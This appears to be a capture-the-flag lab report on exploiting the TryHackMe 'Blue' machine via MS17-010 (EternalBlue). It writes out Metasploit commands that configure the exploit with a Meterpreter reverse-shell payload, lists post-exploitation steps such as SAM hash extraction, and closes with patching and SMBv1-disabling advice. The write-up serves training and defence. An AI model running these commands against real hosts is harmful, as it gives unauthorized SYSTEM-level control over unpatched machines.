Executive Summary

During the authorized penetration test of the TryHackMe: Blue host (10.48.178.132), critical vulnerabilities were discovered enabling an unauthenticated remote attacker to obtain kernel-level administrative control (NT AUTHORITY\SYSTEM).

The primary exploitation vector involved an unpatched implementation of the legacy SMBv1 protocol vulnerable to MS17-010 (EternalBlue). Post-exploitation led to process migration, SAM database hash extraction, offline password cracking via dictionary attack, and recovery of all 3 flags.

Critical Risk Warning: Exploitation of MS17-010 grants instantaneous remote code execution as SYSTEM without credentials, allowing full host takeover, domain privilege escalation, and lateral movement.

2 Vulnerability Scanning & RCE Exploitation

Metasploit was utilized to search for ms17-010 exploit modules and verify target vulnerability.

The scanner auxiliary/scanner/smb/smb_ms17_010 confirmed the target machine was vulnerable. The exploit module exploit/windows/smb/ms17_010_eternalblue was selected and configured:

Metasploit Configuration
msf > use exploit/windows/smb/ms17_010_eternalblue
msf exploit(ms17_010_eternalblue) > set RHOSTS 10.48.178.132
msf exploit(ms17_010_eternalblue) > set LHOST 192.168.140.232
msf exploit(ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp
msf exploit(ms17_010_eternalblue) > exploit
Exploit Success: Nonpaged pool memory allocation succeeded, establishing a Meterpreter shell with full NT AUTHORITY\SYSTEM authority.

Remediation & Mitigation Roadmap

To eliminate these critical attack vectors, the following hardening steps are strongly recommended:

  • Deploy MS17-010 Security Update: Apply Microsoft patch KB4012212 immediately to prevent unauthenticated remote code execution.
  • Disable Legacy SMBv1 Protocol: Remove SMBv1 via Group Policy or PowerShell command:
    PowerShell Remediation
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" SMB1 -Type DWORD -Value 0 -Force
Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol
  • Enforce SMB Signing: Configure Require Security Signature to block NTLM relay and MitM attacks.
  • Improve Password Policies: Enforce strong password rules (14+ characters, mixed sets) to resist offline dictionary cracking.
